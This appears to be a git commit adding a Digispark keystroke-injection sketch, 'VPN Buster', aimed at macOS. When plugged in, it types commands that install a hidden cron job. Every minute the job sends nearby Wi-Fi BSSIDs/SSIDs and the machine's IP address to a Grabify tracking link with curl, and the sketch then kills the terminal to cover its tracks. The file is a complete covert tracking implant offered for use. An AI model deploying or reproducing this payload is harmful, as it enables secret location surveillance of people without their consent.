31ea3ce9ccc304e504d4630207ceb625ec4c483d
Skickar <40251293+skickar@users.noreply.github.com>
2019-06-26 18:15:32 -0700

    VPN Buster: Track IP & nearby Wi-Fi of MacOS
    Digispark VPN Buster: Sends the IP address and BSSID/SSID of nearby Wi-Fi networks on a MacOS computer to a Grabify tracker every 60 seconds.

---
+++ HardTracker.ino
@@ -0,0 +1,29 @@
+#include "DigiKeyboard.h"
+void setup() {}
+void loop() {
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
+  DigiKeyboard.delay(600);
+  DigiKeyboard.print("terminal");
+ DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(5000);
+  DigiKeyboard.print("export VISUAL=nano; crontab -e");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("* * * * * curl --silent --output /dev/null --referer \"$(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s | sed 1d | xargs)\" https://grabify.link/58T3HD");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_X, MOD_CONTROL_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_Y);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("wait && kill -9 $(ps -p $PPID -o ppid=)");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+for(;;){ /*empty*/ }}
+
+
